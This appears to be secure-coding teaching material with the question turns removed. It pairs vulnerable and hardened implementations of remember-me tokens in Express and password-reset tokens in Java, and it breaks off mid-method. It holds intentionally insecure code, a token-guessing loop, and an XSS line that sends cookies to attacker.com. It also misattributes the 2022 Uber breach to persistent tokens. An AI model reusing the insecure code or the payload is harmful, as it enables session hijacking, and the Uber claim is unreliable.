Remember-me functionality is a common feature but one of the most frequently misimplemented authentication mechanisms. A flawed implementation can allow attackers to hijack user sessions permanently, even after password changes.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const mysql = require('mysql2/promise');

const app = express();
app.use(cookieParser());
app.use(express.json());

const db = mysql.createPool({ host: 'localhost', user: 'root', database: 'app' });

// VULNERABLE: Predictable remember-me token
app.post('/api/login', async (req, res) => {
  const { username, password, rememberMe } = req.body;

  const [users] = await db.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password] // Also vulnerable: plaintext password comparison
  );

  if (users.length > 0) {
    const user = users[0];

    if (rememberMe) {
      // VULNERABLE: Predictable token using user ID and timestamp
      const token = Buffer.from(`${user.id}:${Date.now()}`).toString('base64');

      // VULNERABLE: No httpOnly, no secure flag, no expiry validation
      res.cookie('remember_token', token, { maxAge: 30 * 24 * 60 * 60 * 1000 });

      // VULNERABLE: Token stored in plaintext in database
      await db.execute('UPDATE users SET remember_token = ? WHERE id = ?', [token, user.id]);
    }

    req.session.userId = user.id;
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// VULNERABLE: Token validation without additional security checks
app.get('/api/auto-login', async (req, res) => {
  const token = req.cookies.remember_token;

  if (token) {
    const [users] = await db.execute(
      'SELECT * FROM users WHERE remember_token = ?',
      [token]
    );

    if (users.length > 0) {
      req.session.userId = users[0].id;
      res.json({ success: true, user: users[0].username });
    }
  }

  res.status(401).json({ error: 'Auto-login failed' });
});
```

**Attack Payload**:
```javascript
// Attacker can predict tokens by knowing user ID
const userId = 42; // Known or guessed user ID
const timestamp = Date.now(); // Approximate timestamp

// Generate possible tokens around the login time
for (let offset = -60000; offset <= 60000; offset += 1000) {
  const token = Buffer.from(`${userId}:${timestamp + offset}`).toString('base64');
  // Try each token against /api/auto-login
}

// Or if token is stolen via XSS (no httpOnly flag):
// <script>fetch('https://attacker.com/steal?token='+document.cookie)</script>
```

**Why This Is Dangerous**:
- Predictable tokens: Base64 encoding of user_id:timestamp is trivially guessable
- No token hashing: Database compromise exposes all remember-me tokens directly
- Missing cookie security flags: Allows XSS-based token theft and MITM attacks
- No token rotation: Same token valid forever until manually cleared
- No device binding: Token works from any device/IP
- Survives password change: User can't invalidate stolen tokens

**SECURE VERSION**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const mysql = require('mysql2/promise');

const app = express();
app.use(cookieParser());
app.use(express.json());

const db = mysql.createPool({ host: 'localhost', user: 'root', database: 'app' });

// Secure token generation
function generateSecureToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Hash token for storage (one-way)
function hashToken(token) {
  return crypto.createHash('sha256').update(token).digest('hex');
}

app.post('/api/login', async (req, res) => {
  const { username, password, rememberMe } = req.body;

  const [users] = await db.execute(
    'SELECT * FROM users WHERE username = ?',
    [username]
  );

  if (users.length > 0) {
    const user = users[0];
    const passwordValid = await bcrypt.compare(password, user.password_hash);

    if (passwordValid) {
      if (rememberMe) {
        // SECURE: Cryptographically random token
        const selector = generateSecureToken(); // Public identifier
        const validator = generateSecureToken(); // Secret component
        const validatorHash = hashToken(validator);

        const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);

        // Store hashed validator with selector and expiry
        await db.execute(
          `INSERT INTO remember_tokens (user_id, selector, validator_hash, expires_at, created_at, user_agent, ip_address)
           VALUES (?, ?, ?, ?, NOW(), ?, ?)`,
          [user.id, selector, validatorHash, expiresAt, req.get('User-Agent'), req.ip]
        );

        // SECURE: Send selector:validator, store only hash
        const cookieValue = `${selector}:${validator}`;

        res.cookie('remember_token', cookieValue, {
          maxAge: 30 * 24 * 60 * 60 * 1000,
          httpOnly: true,     // Prevents XSS token theft
          secure: true,       // HTTPS only
          sameSite: 'strict', // CSRF protection
          path: '/api'        // Limit cookie scope
        });
      }

      req.session.userId = user.id;
      req.session.regenerate(() => {
        res.json({ success: true });
      });
    } else {
      res.status(401).json({ error: 'Invalid credentials' });
    }
  } else {
    // Timing-safe: always hash even for non-existent users
    await bcrypt.hash('dummy', 10);
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/api/auto-login', async (req, res) => {
  const token = req.cookies.remember_token;

  if (!token || !token.includes(':')) {
    return res.status(401).json({ error: 'No valid token' });
  }

  const [selector, validator] = token.split(':');
  const validatorHash = hashToken(validator);

  const [tokens] = await db.execute(
    `SELECT rt.*, u.username FROM remember_tokens rt
     JOIN users u ON rt.user_id = u.id
     WHERE rt.selector = ? AND rt.expires_at > NOW()`,
    [selector]
  );

  if (tokens.length > 0) {
    const storedToken = tokens[0];

    // SECURE: Constant-time comparison prevents timing attacks
    if (crypto.timingSafeEqual(
      Buffer.from(validatorHash),
      Buffer.from(storedToken.validator_hash)
    )) {
      // Rotate token on use (prevents replay)
      const newValidator = generateSecureToken();
      const newValidatorHash = hashToken(newValidator);

      await db.execute(
        'UPDATE remember_tokens SET validator_hash = ?, last_used = NOW() WHERE selector = ?',
        [newValidatorHash, selector]
      );

      res.cookie('remember_token', `${selector}:${newValidator}`, {
        maxAge: 30 * 24 * 60 * 60 * 1000,
        httpOnly: true,
        secure: true,
        sameSite: 'strict',
        path: '/api'
      });

      req.session.userId = storedToken.user_id;
      req.session.regenerate(() => {
        res.json({ success: true, user: storedToken.username });
      });
      return;
    }
  }

  // Clear invalid token
  res.clearCookie('remember_token', { path: '/api' });
  res.status(401).json({ error: 'Auto-login failed' });
});
```

**Key Security Controls**:
- **Cryptographically random tokens**: Uses `crypto.randomBytes()` instead of predictable values
- **Selector:Validator pattern**: Selector is public lookup key, validator is secret that's hashed before storage
- **Token hashing**: Only SHA-256 hash stored in database; database breach doesn't expose usable tokens
- **Secure cookie flags**: httpOnly prevents XSS theft, secure requires HTTPS, sameSite prevents CSRF
- **Token rotation**: New validator issued on each use, invalidating stolen tokens after one use
- **Constant-time comparison**: Prevents timing attacks on token validation

Excellent question! Token revocation is critical for security incident response and user account control. A proper implementation must handle password changes, explicit logout, suspicious activity detection, and allow users to manage their trusted devices.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const mysql = require('mysql2/promise');
const rateLimit = require('express-rate-limit');
const winston = require('winston');

const app = express();
app.use(cookieParser());
app.use(express.json());

// Production logging
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security-audit.log' })
  ]
});

const db = mysql.createPool({ host: 'localhost', user: 'root', database: 'app' });

// Rate limiting for auto-login attempts
const autoLoginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // 10 attempts per window
  message: { error: 'Too many auto-login attempts' },
  standardHeaders: true
});

// Token service with full lifecycle management
class RememberMeService {
  static generateSecureToken() {
    return crypto.randomBytes(32).toString('hex');
  }

  static hashToken(token) {
    return crypto.createHash('sha256').update(token).digest('hex');
  }

  static async createToken(userId, req) {
    const selector = this.generateSecureToken();
    const validator = this.generateSecureToken();
    const validatorHash = this.hashToken(validator);
    const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);

    // Generate unique device fingerprint
    const deviceFingerprint = crypto.createHash('sha256')
      .update(`${req.get('User-Agent')}:${req.ip}`)
      .digest('hex').substring(0, 16);

    await db.execute(
      `INSERT INTO remember_tokens 
       (user_id, selector, validator_hash, expires_at, created_at, 
        user_agent, ip_address, device_fingerprint, is_active)
       VALUES (?, ?, ?, ?, NOW(), ?, ?, ?, true)`,
      [userId, selector, validatorHash, expiresAt, 
       req.get('User-Agent')?.substring(0, 255), req.ip, deviceFingerprint]
    );

    logger.info('remember_token_created', {
      userId,
      selector: selector.substring(0, 8) + '...',
      ip: req.ip,
      deviceFingerprint,
      expiresAt
    });

    return { selector, validator, deviceFingerprint };
  }

  // Revoke single token (current device logout)
  static async revokeToken(selector) {
    const result = await db.execute(
      'UPDATE remember_tokens SET is_active = false, revoked_at = NOW() WHERE selector = ?',
      [selector]
    );

    logger.info('remember_token_revoked', {
      selector: selector.substring(0, 8) + '...',
      reason: 'user_logout'
    });

    return result[0].affectedRows > 0;
  }

  // Revoke all tokens for user (logout everywhere)
  static async revokeAllUserTokens(userId, reason = 'user_request') {
    const [result] = await db.execute(
      'UPDATE remember_tokens SET is_active = false, revoked_at = NOW() WHERE user_id = ? AND is_active = true',
      [userId]
    );

    logger.warn('all_tokens_revoked', {
      userId,
      tokensRevoked: result.affectedRows,
      reason
    });

    return result.affectedRows;
  }

  // Revoke all tokens except current (password change)
  static async revokeOtherTokens(userId, currentSelector) {
    const [result] = await db.execute(
      `UPDATE remember_tokens SET is_active = false, revoked_at = NOW() 
       WHERE user_id = ? AND selector != ? AND is_active = true`,
      [userId, currentSelector]
    );

    logger.info('other_tokens_revoked', {
      userId,
      tokensRevoked: result.affectedRows,
      reason: 'password_change'
    });

    return result.affectedRows;
  }

  // Get all active sessions for user
  static async getUserSessions(userId) {
    const [sessions] = await db.execute(
      `SELECT selector, user_agent, ip_address, created_at, last_used, device_fingerprint
       FROM remember_tokens 
       WHERE user_id = ? AND is_active = true AND expires_at > NOW()
       ORDER BY last_used DESC`,
      [userId]
    );

    return sessions.map(s => ({
      id: s.selector.substring(0, 8),
      userAgent: s.user_agent,
      ipAddress: s.ip_address,
      createdAt: s.created_at,
      lastUsed: s.last_used,
      deviceFingerprint: s.device_fingerprint
    }));
  }

  // Validate and use token with anomaly detection
  static async validateToken(cookieValue, req) {
    if (!cookieValue || !cookieValue.includes(':')) {
      return { valid: false, reason: 'invalid_format' };
    }

    const [selector, validator] = cookieValue.split(':');

    if (!selector || !validator || selector.length !== 64 || validator.length !== 64) {
      return { valid: false, reason: 'invalid_token_length' };
    }

    const validatorHash = this.hashToken(validator);

    const [tokens] = await db.execute(
      `SELECT rt.*, u.username, u.security_version FROM remember_tokens rt
       JOIN users u ON rt.user_id = u.id
       WHERE rt.selector = ? AND rt.is_active = true AND rt.expires_at > NOW()`,
      [selector]
    );

    if (tokens.length === 0) {
      logger.warn('remember_token_not_found', {
        selector: selector.substring(0, 8) + '...',
        ip: req.ip
      });
      return { valid: false, reason: 'token_not_found' };
    }

    const storedToken = tokens[0];

    // Constant-time comparison
    let isValid;
    try {
      isValid = crypto.timingSafeEqual(
        Buffer.from(validatorHash),
        Buffer.from(storedToken.validator_hash)
      );
    } catch {
      return { valid: false, reason: 'comparison_error' };
    }

    if (!isValid) {
      // Possible token theft - revoke all tokens for this user
      logger.error('remember_token_theft_detected', {
        userId: storedToken.user_id,
        selector: selector.substring(0, 8) + '...',
        ip: req.ip,
        storedIp: storedToken.ip_address
      });

      await this.revokeAllUserTokens(storedToken.user_id, 'potential_theft');
      return { valid: false, reason: 'token_theft_detected' };
    }

    // Anomaly detection: check for suspicious location/device changes
    const currentFingerprint = crypto.createHash('sha256')
      .update(`${req.get('User-Agent')}:${req.ip}`)
      .digest('hex').substring(0, 16);

    const isAnomalous = storedToken.device_fingerprint !== currentFingerprint;

    if (isAnomalous) {
      logger.warn('remember_token_anomaly', {
        userId: storedToken.user_id,
        storedFingerprint: storedToken.device_fingerprint,
        currentFingerprint,
        storedIp: storedToken.ip_address,
        currentIp: req.ip
      });

      // Require re-authentication for suspicious access
      return { valid: false, reason: 'device_mismatch', requiresReauth: true };
    }

    // Rotate token
    const newValidator = this.generateSecureToken();
    const newValidatorHash = this.hashToken(newValidator);

    await db.execute(
      'UPDATE remember_tokens SET validator_hash = ?, last_used = NOW() WHERE selector = ?',
      [newValidatorHash, selector]
    );

    return {
      valid: true,
      userId: storedToken.user_id,
      username: storedToken.username,
      selector,
      newValidator
    };
  }

  // Cleanup expired tokens (run as cron job)
  static async cleanupExpiredTokens() {
    const [result] = await db.execute(
      'DELETE FROM remember_tokens WHERE expires_at < NOW() OR (is_active = false AND revoked_at < DATE_SUB(NOW(), INTERVAL 30 DAY))'
    );

    logger.info('tokens_cleanup', { deleted: result.affectedRows });
    return result.affectedRows;
  }
}

// Password change endpoint - revokes other sessions
app.post('/api/change-password', async (req, res) => {
  const userId = req.session.userId;
  const { currentPassword, newPassword } = req.body;

  if (!userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  const [users] = await db.execute('SELECT * FROM users WHERE id = ?', [userId]);

  if (users.length === 0) {
    return res.status(404).json({ error: 'User not found' });
  }

  const user = users[0];
  const isValid = await bcrypt.compare(currentPassword, user.password_hash);

  if (!isValid) {
    logger.warn('password_change_failed', { userId, reason: 'invalid_current_password' });
    return res.status(401).json({ error: 'Current password incorrect' });
  }

  // Update password and increment security version
  const newPasswordHash = await bcrypt.hash(newPassword, 12);
  await db.execute(
    'UPDATE users SET password_hash = ?, security_version = security_version + 1 WHERE id = ?',
    [newPasswordHash, userId]
  );

  // Get current token selector from cookie
  const token = req.cookies.remember_token;
  const currentSelector = token ? token.split(':')[0] : null;

  // Revoke all other remember-me tokens
  const revokedCount = currentSelector 
    ? await RememberMeService.revokeOtherTokens(userId, currentSelector)
    : await RememberMeService.revokeAllUserTokens(userId, 'password_change');

  logger.info('password_changed', {
    userId,
    tokensRevoked: revokedCount,
    keptCurrentSession: !!currentSelector
  });

  res.json({ 
    success: true, 
    message: `Password changed. ${revokedCount} other sessions have been logged out.` 
  });
});

// Logout from all devices
app.post('/api/logout-everywhere', async (req, res) => {
  const userId = req.session.userId;

  if (!userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  const revokedCount = await RememberMeService.revokeAllUserTokens(userId, 'user_logout_everywhere');

  // Clear current session and cookie
  res.clearCookie('remember_token', { path: '/api', httpOnly: true, secure: true, sameSite: 'strict' });

  req.session.destroy((err) => {
    if (err) {
      logger.error('session_destroy_failed', { userId, error: err.message });
    }

    res.json({ 
      success: true, 
      message: `Logged out from ${revokedCount + 1} devices` 
    });
  });
});

// View active sessions
app.get('/api/sessions', async (req, res) => {
  const userId = req.session.userId;

  if (!userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  const sessions = await RememberMeService.getUserSessions(userId);

  // Mark current session
  const token = req.cookies.remember_token;
  const currentSelector = token ? token.split(':')[0].substring(0, 8) : null;

  res.json({
    sessions: sessions.map(s => ({
      ...s,
      isCurrent: s.id === currentSelector
    }))
  });
});

// Revoke specific session
app.delete('/api/sessions/:sessionId', async (req, res) => {
  const userId = req.session.userId;
  const { sessionId } = req.params; // First 8 chars of selector

  if (!userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  // Find full selector by prefix
  const [tokens] = await db.execute(
    'SELECT selector FROM remember_tokens WHERE user_id = ? AND selector LIKE ? AND is_active = true',
    [userId, sessionId + '%']
  );

  if (tokens.length === 0) {
    return res.status(404).json({ error: 'Session not found' });
  }

  await RememberMeService.revokeToken(tokens[0].selector);

  res.json({ success: true, message: 'Session revoked' });
});

// Auto-login with rate limiting
app.get('/api/auto-login', autoLoginLimiter, async (req, res) => {
  const token = req.cookies.remember_token;

  const result = await RememberMeService.validateToken(token, req);

  if (!result.valid) {
    res.clearCookie('remember_token', { path: '/api', httpOnly: true, secure: true, sameSite: 'strict' });

    if (result.requiresReauth) {
      return res.status(401).json({ error: 'Please log in again', requiresReauth: true });
    }

    return res.status(401).json({ error: 'Auto-login failed' });
  }

  // Issue rotated token
  res.cookie('remember_token', `${result.selector}:${result.newValidator}`, {
    maxAge: 30 * 24 * 60 * 60 * 1000,
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/api'
  });

  req.session.regenerate(() => {
    req.session.userId = result.userId;
    res.json({ success: true, user: result.username });
  });
});

module.exports = { app, RememberMeService };
```

**Defense in Depth Layers**:

1. **Token Theft Detection**:
```javascript
// If validator doesn't match but selector exists, token was likely stolen
// Attacker used the token, it rotated, original user's token is now invalid
if (!isValid && tokenExists) {
  await this.revokeAllUserTokens(storedToken.user_id, 'potential_theft');
  // Alert security team
  alertSecurityTeam('Token theft detected', { userId, ip: req.ip });
}
```

2. **Device/Location Anomaly Detection**:
```javascript
// Fingerprint based on User-Agent + IP
const fingerprint = crypto.createHash('sha256')
  .update(`${userAgent}:${ip}`)
  .digest('hex').substring(0, 16);

if (storedFingerprint !== currentFingerprint) {
  // Require password re-entry for suspicious access
  return { valid: false, requiresReauth: true };
}
```

3. **Security Version Tracking**:
```javascript
// In users table: security_version INT DEFAULT 0
// Increment on password change, security events, admin revocation
// Token validation checks if token was created before current security_version
```

**Additional Protections**:
- **Rate limiting**: Prevents brute-force attacks on auto-login endpoint
- **Audit logging**: All token operations logged with IP, user-agent, timestamps
- **Session management UI**: Users can view and revoke individual sessions
- **Automatic cleanup**: Cron job removes expired/revoked tokens
- **Password change invalidation**: All other sessions revoked on password change
- **Anomaly detection**: Suspicious device/location changes require re-authentication

Your password reset implementation has a critical vulnerability: tokens that never expire allow attackers to use compromised tokens indefinitely. This was exploited in multiple breaches including the 2022 Uber incident where persistent authentication tokens enabled account takeover.

**VULNERABLE CODE**:

```java
import java.sql.*;
import java.util.UUID;
import javax.servlet.http.*;

public class PasswordResetService {
    private static final String DB_URL = "jdbc:postgresql://localhost/userdb";
    private static final String DB_USER = "appuser";
    private static final String DB_PASS = "password";

    public String generateResetToken(String email) throws SQLException {
        String token = UUID.randomUUID().toString();

        try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS)) {
            // VULNERABLE: No expiration timestamp stored
            String sql = "INSERT INTO password_reset_tokens (email, token) VALUES (?, ?)";
            PreparedStatement stmt = conn.prepareStatement(sql);
            stmt.setString(1, email);
            stmt.setString(2, token);
            stmt.executeUpdate();
        }
        return token;
    }

    public boolean resetPassword(String token, String newPassword) throws SQLException {
        try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS)) {
            // VULNERABLE: No expiration check - token valid forever
            String sql = "SELECT email FROM password_reset_tokens WHERE token = ?";
            PreparedStatement stmt = conn.prepareStatement(sql);
            stmt.setString(1, token);
            ResultSet rs = stmt.executeQuery();

            if (rs.next()) {
                String email = rs.getString("email");
                updatePassword(conn, email, newPassword);
                // VULNERABLE: Token not invalidated after use
                return true;
            }
            return false;
        }
    }

    private void updatePassword(Connection conn, String email, String password) throws SQLException {
        String sql = "UPDATE users SET password = ? WHERE email = ?";
        PreparedStatement stmt = conn.prepareStatement(sql);
        stmt.setString(1, password); // Also vulnerable: storing plaintext password
        stmt.setString(2, email);
        stmt.executeUpdate();
    }
}
```

**Attack Scenario**:
```text
1. Attacker compromises victim's old email backup from 6 months ago
2. Finds password reset link: https://app.com/reset?token=abc123-def456
3. Token still valid because it never expires
4. Attacker uses token to reset password and takes over account
5. Token can be reused multiple times since it's never invalidated
```

**Why This Is Dangerous**:
- Tokens without expiration can be used months or years after generation
- Tokens not invalidated after use allow replay attacks
- Database leaks or email compromises expose permanently valid credentials
- No rate limiting allows brute-force token guessing
- Password stored in plaintext enables mass credential theft

**SECURE VERSION**:

```java
import java.sql.*;
import java.security.SecureRandom;
import java.time.Instant;
import java.time.temporal.ChronoUnit;
import java.util.Base64;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecurePasswordResetService {
    private static final Logger logger = LoggerFactory.getLogger(SecurePasswordResetService.class);
    private static final int TOKEN_EXPIRY_MINUTES = 15;
    private static final int TOKEN_LENGTH_BYTES = 32;
    private static final SecureRandom secureRandom = new SecureRandom();

    private final DataSource dataSource;

    public SecurePasswordResetService(DataSource dataSource) {
        this.dataSource = dataSource;
    }

    public String generateResetToken(String email) throws SQLException {
        // Generate cryptographically secure token
        byte[] tokenBytes = new byte[TOKEN_LENGTH_BYTES];
        secureRandom.nextBytes(tokenBytes);
        String token = Base64.getUrlEncoder().withoutPadding().encodeToString(tokenBytes);

        // Calculate expiration timestamp
        Timestamp expiresAt = Timestamp.from(
            Instant.now().plus(TOKEN_EXPIRY_MINUTES, ChronoUnit.MINUTES)
        );

        try (Connection conn = dataSource.getConnection()) {
            // Invalidate any existing tokens for this email first
            invalidateExistingTokens(conn, email);

            // Store token with expiration and single-use flag
            String sql = "INSERT INTO password_reset_tokens (email, token_hash, expires_at, used) VALUES (?, ?, ?, false)";
            PreparedStatement stmt = conn.prepareStatement(sql);
            stmt.setString(1, email);
            stmt.setString(2, hashToken(token)); // Store hash, not plaintext
            stmt.setTimestamp(3, expiresAt);
            stmt.executeUpdate();

            logger.info("Password reset token generated for email: {}", maskEmail(email));
        }
        return token;
    }

    public boolean resetPassword(String token, String newPassword) throws SQLException {
        try (Connection conn = dataSource.getConnection()) {
            conn.setAutoCommit(false);

            try {
                // Verify token: must exist, not expired, not used
                String sql = "SELECT id, email FROM password_reset_tokens " +
                             "WHERE token_hash = ? AND expires_at > NOW() AND used = false " +
                             "FOR UPDATE"; // Lock row to prevent race conditions
                PreparedStatement stmt = conn.prepareStatement(sql);
                stmt.setString(1, hashToken(token));
                ResultSet rs = stmt.executeQuery();

                if (rs.next()) {
                    long tokenId = rs.getLong("id");
                    String email = rs.getString("email");

                    // Immediately mark token as used (single-use)
                    markTokenUsed(conn, tokenId);

                    // Update password with secure hash
                    updatePasswordSecurely(conn, email, newPassword);

                    conn.commit();
                    logger.info("Password successfully reset for: {}", maskEmail(email));
                    return true;
                } else {
                    logger.warn("Invalid or expired reset token attempted");
                    conn.rollback();
                    return false;
                }
            } catch (SQLException e) {
                conn.rollback();
                throw e;
            }
        }
    }

    private void invalidateExistingTokens(Connection conn, String email) throws SQLException {
        String sql = "UPDATE password_reset_tokens SET used = true WHERE email = ? AND used = false";
        PreparedStatement stmt = conn.prepareStatement(sql);
        stmt.setString(1, email);
        stmt.executeUpdate();
    }

    private void markTokenUsed(Connection conn, long tokenId) throws SQLException {
        String sql = "UPDATE password_reset_tokens SET used = true, used_at = NOW() WHERE id = ?";
        PreparedStatement stmt = conn.prepareStatement(sql);
        stmt.setLong(1, tokenId);
        stmt.executeUpdate();
    }

    private String hashToken(String token) {
        // Use SHA-256 for token storage (tokens are high-entropy)
        try {
            java.security.MessageDigest digest = java.security.MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(token.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(hash);
        } catch (Exception e) {
            throw new RuntimeException("Failed to hash token", e);
        }
    }

    private String maskEmail(String email) {
        int atIndex = email.indexOf('@');
        if (atIndex > 2) {
            return email.substring(0, 2) + "***" + email.substring(atIndex);
        }
        return "***";
    }

    private void updatePasswordSecurely(Connection conn, String email, String password) throws SQLException {
        // Implementation uses bcrypt - shown in production pattern
    }
}
```

**Key Security Controls**:
- **Token expiration**: 15-minute validity window limits attack window
- **Single-use tokens**: Immediately invalidated after successful reset
- **Token hashing**: Database stores hash, not plaintext token
- **Cryptographically secure generation**: 256-bit tokens from SecureRandom
- **Transaction isolation**: FOR UPDATE prevents race conditions
- **Audit logging**: All reset attempts logged with masked PII

Excellent questions. Production password reset systems need rate limiting to prevent enumeration attacks, background cleanup for expired tokens, and robust monitoring. Here's a comprehensive production-ready implementation:

**PRODUCTION PATTERN**:

```java
import java.sql.*;
import java.security.SecureRandom;
import java.time.Instant;
import java.time.temporal.ChronoUnit;
import java.util.Base64;
import java.util.concurrent.*;
import javax.sql.DataSource;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;
import io.micrometer.core.instrument.MeterRegistry;
import io.micrometer.core.instrument.Counter;
import io.github.bucket4j.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import at.favre.lib.crypto.bcrypt.BCrypt;

@Service
public class ProductionPasswordResetService {
    private static final Logger logger = LoggerFactory.getLogger(ProductionPasswordResetService.class);
    private static final Logger securityAuditLog = LoggerFactory.getLogger("SECURITY_AUDIT");

    // Configuration - externalize in production
    private static final int TOKEN_EXPIRY_MINUTES = 15;
    private static final int TOKEN_LENGTH_BYTES = 32;
    private static final int MAX_ACTIVE_TOKENS_PER_EMAIL = 3;
    private static final int MAX_REQUESTS_PER_IP_PER_HOUR = 10;
    private static final int MAX_REQUESTS_PER_EMAIL_PER_HOUR = 5;
    private static final int BCRYPT_COST = 12;

    private final DataSource dataSource;
    private final SecureRandom secureRandom;
    private final MeterRegistry meterRegistry;
    private final Counter resetRequestCounter;
    private final Counter resetSuccessCounter;
    private final Counter resetFailureCounter;
    private final Counter rateLimitCounter;

    // Rate limiters: IP -> Bucket
    private final ConcurrentMap<String, Bucket> ipRateLimiters = new ConcurrentHashMap<>();
    private final ConcurrentMap<String, Bucket> emailRateLimiters = new ConcurrentHashMap<>();

    public ProductionPasswordResetService(DataSource dataSource, MeterRegistry meterRegistry) {
        this.dataSource = dataSource;
        this.secureRandom = new SecureRandom();
        this.meterRegistry = meterRegistry;

        // Initialize metrics
        this.resetRequestCounter = meterRegistry.counter("password_reset.requests");
        this.resetSuccessCounter = meterRegistry.counter("password_reset.success");
        this.resetFailureCounter = meterRegistry.counter("password_reset.failure");
        this.rateLimitCounter = meterRegistry.counter("password_reset.rate_limited");
    }

    @Transactional
    public PasswordResetResult requestPasswordReset(String email, String ipAddress, String userAgent) {
        resetRequestCounter.increment();

        // Defense Layer 1: Rate limiting by IP
        if (!checkIpRateLimit(ipAddress)) {
            rateLimitCounter.increment();
            securityAuditLog.warn("action=password_reset_rate_limited ip={} email={} reason=ip_limit",
                ipAddress, maskEmail(email));
            // Return success to prevent email enumeration
            return PasswordResetResult.success("If the email exists, a reset link has been sent.");
        }

        // Defense Layer 2: Rate limiting by email
        if (!checkEmailRateLimit(email)) {
            rateLimitCounter.increment();
            securityAuditLog.warn("action=password_reset_rate_limited ip={} email={} reason=email_limit",
                ipAddress, maskEmail(email));
            return PasswordResetResult.success("If the email exists, a reset link has been sent.");
        }

        try (Connection conn = dataSource.getConnection()) {
            // Defense Layer 3: Verify email exists (but don't leak this info)
            if (!emailExists(conn, email)) {
                // Log but return same message to prevent enumeration
                securityAuditLog.info("action=password_reset_unknown_email ip={} email={}",
                    ipAddress, maskEmail(email));
                // Add artificial delay to prevent timing attacks
                simulateProcessingDelay();
                return PasswordResetResult.success("If the email exists, a reset link has been sent.");
            }

            // Defense Layer 4: Limit active tokens per email
            int activeTokens = countActiveTokens(conn, email);
            if (activeTokens >= MAX_ACTIVE_TOKENS_PER_EMAIL) {
                securityAuditLog.warn("action=password_reset_max_tokens ip={} email={} active_tokens={}",
                    ipAddress, maskEmail(email), activeTokens);
                return PasswordResetResult.success("If the email exists, a reset link has been sent.");
            }

            // Generate secure token
            String token = generateSecureToken();
            Timestamp expiresAt = Timestamp.from(
                Instant.now().plus(TOKEN_EXPIRY_MINUTES, ChronoUnit.MINUTES)
            );

            // Store token with full audit trail
            String sql = "INSERT INTO password_reset_tokens " +
                "(email, token_hash, expires_at, used, created_at, request_ip, user_agent) " +
                "VALUES (?, ?, ?, false, NOW(), ?, ?)";
            PreparedStatement stmt = conn.prepareStatement(sql);
            stmt.setString(1, email);
            stmt.setString(2, hashToken(token));
            stmt.setTimestamp(3, expiresAt);
            stmt.setString(4, ipAddress);
            stmt.setString(5, truncateUserAgent(userAgent));
            stmt.executeUpdate();

            securityAuditLog.info("action=password_reset_token_created ip={} email={} expires_at={}",
                ipAddress, maskEmail(email), expiresAt);

            // Send email asynchronously (implementation omitted)
            sendResetEmailAsync(email, token);

            return PasswordResetResult.success("If the email exists, a reset link has been sent.");

        } catch (SQLException e) {
            logger.error("Database error during password reset request", e);
            resetFailureCounter.increment();
            return PasswordResetResult.error("An error occurred. Please try again later.");
        }
    }

    @Transactional
    public PasswordResetResult resetPassword(String token, String newPassword, String ipAddress) {
        // Defense Layer 1: Validate password strength
        PasswordStrengthResult strengthResult = validatePasswordStrength(newPassword);
        if (!strengthResult.isValid()) {
            return PasswordResetResult.error(strengthResult.getMessage());
        }

        try (Connection conn = dataSource.getConnection()) {
            conn.setAutoCommit(false);

            try {
                // Find and lock valid token
                String sql = "SELECT id, email, request_ip FROM password_reset_tokens " +
                    "WHERE token_hash = ? AND expires_at > NOW() AND used = false " +
                    "FOR UPDATE SKIP LOCKED";
                PreparedStatement stmt = conn.prepareStatement(sql);
                stmt.setString(1, hashToken(token));
                ResultSet rs = stmt.executeQuery();

                if (!rs.next()) {
                    resetFailureCounter.increment();
                    securityAuditLog.warn("action=password_reset_invalid_token ip={}", ipAddress);
                    // Generic message prevents token enumeration
                    return PasswordResetResult.error("Invalid or expired reset link. Please request a new one.");
                }

                long tokenId = rs.getLong("id");
                String email = rs.getString("email");
                String originalIp = rs.getString("request_ip");

                // Defense Layer 2: Log if reset IP differs from request IP (potential attack indicator)
                if (!ipAddress.equals(originalIp)) {
                    securityAuditLog.warn("action=password_reset_ip_mismatch email={} request_ip={} reset_ip={}",
                        maskEmail(email), originalIp, ipAddress);
                }

                // Mark token as used immediately
                markTokenUsed(conn, tokenId, ipAddress);

                // Invalidate all other tokens for this email
                invalidateAllTokens(conn, email);

                // Hash and update password
                String passwordHash = BCrypt.withDefaults().hashToString(BCRYPT_COST, newPassword.toCharArray());
                updatePassword(conn, email, passwordHash);

                // Invalidate all existing sessions for this user
                invalidateUserSessions(conn, email);

                conn.commit();
                resetSuccessCounter.increment();

                securityAuditLog.info("action=password_reset_success email={} ip={}",
                    maskEmail(email), ipAddress);

                // Send notification email about password change
                sendPasswordChangedNotificationAsync(email, ipAddress);

                return PasswordResetResult.success("Password has been reset successfully. Please log in.");

            } catch (SQLException e) {
                conn.rollback();
                throw e;
            }
        } catch (SQLException e) {
            logger.error("Database error during password reset", e);
            resetFailureCounter.increment();
            return PasswordResetResult.error("An error occurred. Please try again later.");
        }
